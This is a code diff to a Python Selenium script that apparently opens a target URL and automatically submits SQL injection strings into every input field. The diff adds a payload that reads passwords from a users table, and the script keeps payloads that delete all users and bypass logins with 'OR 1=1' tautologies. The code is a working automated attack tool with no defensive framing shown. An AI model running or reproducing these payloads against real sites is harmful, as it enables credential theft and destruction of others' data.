@@ -21,7 +21,7 @@ def button_click(event):
         runAttacks(url)
 
 def runAttacks(url):
-    INJECTION_QUERIES = ["s'; DELETE FROM users WHERE 1=1; --", "1' OR 1=1 --", "%' or 1=1 --"]
+    INJECTION_QUERIES = ["s'; SELECT password FROM users WHERE 1=1; --", "s'; DELETE FROM users WHERE 1=1; --", "1' OR 1=1 --", "%' or 1=1 --"]
 
     driver = Chrome()
     #print(driver.request('POST', url))
@@ -34,7 +34,8 @@ def runAttacks(url):
         print("passField not found")
     forms = driver.find_elements_by_tag_name('input')
     i = 0
-    while i < len(forms):
+    keepGoing = True
+    while keepGoing:
         # continue trying until we run out of queries
         for query in INJECTION_QUERIES:
             print("QUERY START: " + query)
@@ -67,6 +68,9 @@ def runAttacks(url):
                 form.clear()
             time.sleep(2)
             i += 1
+            if i >= len(forms):
+                keepGoing = False
+                break
             print(i)
             print(len(forms))
     driver.quit()
